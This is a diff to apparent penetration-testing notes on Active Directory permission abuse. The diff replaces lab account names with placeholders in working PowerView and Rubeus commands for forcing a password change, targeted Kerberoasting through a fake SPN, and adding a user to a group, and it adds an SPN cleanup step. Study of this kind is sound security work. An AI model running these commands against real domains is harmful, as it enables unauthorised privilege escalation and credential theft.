@@ -108,7 +108,7 @@ Use the `wley` user to change the password for the `damundsen` user
 create a [PSCredential object](https://docs.microsoft.com/en-us/dotnet/api/system.management.automation.pscredential?view=powershellsdk-7.0.0) for `wley` using his password
 ```powershell
 $SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
+$Cred = New-Object System.Management.Automation.PSCredential('<Domain\User>', $SecPassword)
 ```
 create a [SecureString object](https://docs.microsoft.com/en-us/dotnet/api/system.security.securestring?view=net-6.0) which represents the password we want to set for the target user damundsen.
 ```powershell
@@ -132,18 +132,25 @@ damundsen user have GenericWrite over adunn user so we can do Targeted Kerberoas
 create a [PSCredential object](https://docs.microsoft.com/en-us/dotnet/api/system.management.automation.pscredential?view=powershellsdk-7.0.0) for `damundsen` using his password
 ```powershell
 $SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
+$Cred = New-Object System.Management.Automation.PSCredential('<Domain\User>', $SecPassword)
 ```
 
 create the fake SPN for `adunn` user
 ```powershell
-Set-DomainObject -Credential $Cred -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
+Set-DomainObject -Credential $Cred -Identity <Target User> -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
 ```
 
 use `Rubeus` to catch the ticket also check this [kerberoasting](https://github.com/kiro6/penetration-testing-notes/blob/main/Penetration%20Testing/Kerberos%20attacks/README.md#kerberoasting)
 ```powershell
-.\Rubeus.exe kerberoast /user:adunn /nowrap
+.\Rubeus.exe kerberoast /user:<User> /nowrap
 ```
+
+### Clean
+
+```
+Set-DomainObject -Credential $Cred -Identity <User to remove> -Clear serviceprincipalname -Verbose
+```
+
 
 ## Add to group 
 needed controls `GenericAll` or `GenericWrite`  
@@ -156,14 +163,14 @@ damundsen user have GenericWrite over Help Desk Level 1 group so we can add our 
 create a [PSCredential object](https://docs.microsoft.com/en-us/dotnet/api/system.management.automation.pscredential?view=powershellsdk-7.0.0) for `damundsen` using his password
 ```powershell
 $SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
+$Cred = New-Object System.Management.Automation.PSCredential('<Domain\User>', $SecPassword)
 ```
 
 using PowerView add yourslef
 ```powershell
 # check group members
-Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members
+Get-ADGroup -Identity "<Group Name>" -Properties * | Select -ExpandProperty Members
 
 # add your user
-Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred -Verbose
+Add-DomainGroupMember -Identity '<Group Name>' -Members '<User to Add>' -Credential $Cred -Verbose
 ```
